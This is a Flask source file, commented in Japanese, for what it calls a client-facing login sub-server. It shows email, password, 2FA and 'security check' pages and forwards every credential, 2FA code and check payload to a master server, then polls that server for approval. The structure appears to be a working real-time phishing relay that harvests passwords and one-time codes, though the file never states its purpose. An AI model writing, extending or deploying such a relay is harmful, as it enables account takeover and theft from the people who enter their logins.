"""
サブサーバー: クライアント向けログインサイト
"""
from flask import Flask, request, jsonify, render_template, session
import requests
import threading
import time
from datetime import datetime
from config import SECRET_KEY, DEBUG, MASTER_SERVER_URL, CALLBACK_URL

app = Flask(__name__, template_folder='templates')
app.secret_key = SECRET_KEY

# 接続チェック結果を保存
connection_check_results = {}

# 2FA・認証管理
twofa_sessions = {}  # {email: {status, codes, security_check}}

# ===========================
# ポーリング管理
# ===========================

def start_polling(request_id):
    """0.5秒ごとにポーリング"""
    def poll():
        max_attempts = 120
        attempt = 0
        
        while attempt < max_attempts:
            try:
                response = requests.get(
                    f"{MASTER_SERVER_URL}/api/request-result/connectioncheck/{request_id}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    status = data.get('status')
                    
                    if status in ['success', 'failed', 'timeout']:
                        connection_check_results[request_id] = {
                            'status': status,
                            'pc_id': data.get('locked_by'),
                            'received_at': datetime.now().isoformat()
                        }
                        break
                
            except Exception as e:
                print(f"[ERROR] ポーリングエラー: {e}")
            
            attempt += 1
            time.sleep(0.5)
    
    thread = threading.Thread(target=poll, daemon=True)
    thread.start()

def poll_twofa_status(email):
    """2FA承認状態を0.5秒ごとにポーリング"""
    def poll():
        max_attempts = 120
        attempt = 0
        
        while attempt < max_attempts:
            try:
                response = requests.get(
                    f"{MASTER_SERVER_URL}/api/twofa-status/{email}",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    
                    if email not in twofa_sessions:
                        twofa_sessions[email] = {}
                    
                    twofa_sessions[email].update(data)
                    
                    # 承認されたら終了
                    if data.get('approved'):
                        break
                
            except Exception as e:
                print(f"[ERROR] 2FAポーリングエラー: {e}")
            
            attempt += 1
            time.sleep(0.5)
    
    thread = threading.Thread(target=poll, daemon=True)
    thread.start()

# ===========================
# ルート定義
# ===========================

@app.route('/')
def index():
    return render_template('loginemail.html')

@app.route('/login/email')
def login_email():
    return render_template('loginemail.html')

@app.route('/login/password')
def login_password():
    return render_template('loginpassword.html')

@app.route('/login/2fa')
def login_2fa():
    return render_template('login2fa.html')

@app.route('/dashboard/security-check')
def dashboard_security_check():
    return render_template('dashboardsecuritycheck.html')

@app.route('/dashboard/complete')
def dashboard_complete():
    return render_template('dashboardcomplete.html')

@app.route('/check')
def check():
    return render_template('check.html')

# ===========================
# API: 接続チェック
# ===========================

@app.route('/api/check-connection', methods=['POST'])
def check_connection():
    """接続チェックリクエストを送信"""
    try:
        response = requests.post(f"{MASTER_SERVER_URL}/api/request", json={
            'genre': 'connectioncheck',
            'callback_url': CALLBACK_URL
        }, timeout=10)
        
        if response.status_code == 201:
            data = response.json()
            request_id = data['request_id']
            
            connection_check_results[request_id] = {
                'status': 'pending',
                'created_at': datetime.now().isoformat()
            }
            
            start_polling(request_id)
            
            return jsonify({
                'success': True,
                'request_id': request_id,
                'message': '接続チェックリクエストを送信しました'
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': f'本サーバーエラー: {response.status_code}'
            }), 500
            
    except Exception as e:
        print(f"[ERROR] 接続チェックエラー: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/check-result/<request_id>', methods=['GET'])
def get_check_result(request_id):
    """接続チェック結果を取得"""
    result = connection_check_results.get(request_id)
    
    if result:
        return jsonify(result), 200
    else:
        return jsonify({'error': 'Result not found'}), 404

# ===========================
# API: ログイン処理
# ===========================

@app.route('/api/login', methods=['POST'])
def api_login():
    """ログインリクエストを本サーバーに転送"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        password = data.get('password', '').strip()
        
        # 本サーバーにログインリクエスト
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/login",
            json={'email': email, 'password': password},
            timeout=120
        )
        
        result = response.json()
        
        if result.get('success'):
            # 2FAポーリング開始
            poll_twofa_status(email)
        
        return jsonify(result), response.status_code
        
    except Exception as e:
        print(f"[ERROR] ログインエラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

# ===========================
# API: 2FA処理
# ===========================

@app.route('/api/2fa/submit', methods=['POST'])
def api_2fa_submit():
    """2FAコードを本サーバーに送信"""
    try:
        data = request.json
        email = data.get('email', '').strip()
        code = data.get('code', '').strip()
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/2fa/submit",
            json={'email': email, 'code': code},
            timeout=10
        )
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] 2FA送信エラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/2fa/check-status', methods=['POST'])
def api_2fa_check_status():
    """2FA承認状態をチェック"""
    data = request.json
    email = data.get('email', '').strip()
    
    session_data = twofa_sessions.get(email, {})
    
    return jsonify({
        'success': True,
        'is_approved': session_data.get('approved', False),
        'rejected': session_data.get('rejected', False)
    }), 200

# ===========================
# API: セキュリティチェック
# ===========================

@app.route('/api/security-check/submit', methods=['POST'])
def api_security_check_submit():
    """セキュリティチェックを本サーバーに送信"""
    try:
        data = request.json
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/security-check/submit",
            json=data,
            timeout=10
        )
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェックエラー: {e}")
        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500

@app.route('/api/security-check/check-status', methods=['POST'])
def api_security_check_status():
    """セキュリティチェック完了状態をチェック"""
    try:
        data = request.json
        
        response = requests.post(
            f"{MASTER_SERVER_URL}/api/security-check/check-status",
            json=data,
            timeout=10
        )
        
        return jsonify(response.json()), response.status_code
        
    except Exception as e:
        print(f"[ERROR] セキュリティチェック状態確認エラー: {e}")
        return jsonify({'success': False}), 500

if __name__ == '__main__':
    print("=" * 60)
    print("サブサーバー起動")
    print("=" * 60)
    print(f"本サーバー: {MASTER_SERVER_URL}")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5001, debug=DEBUG)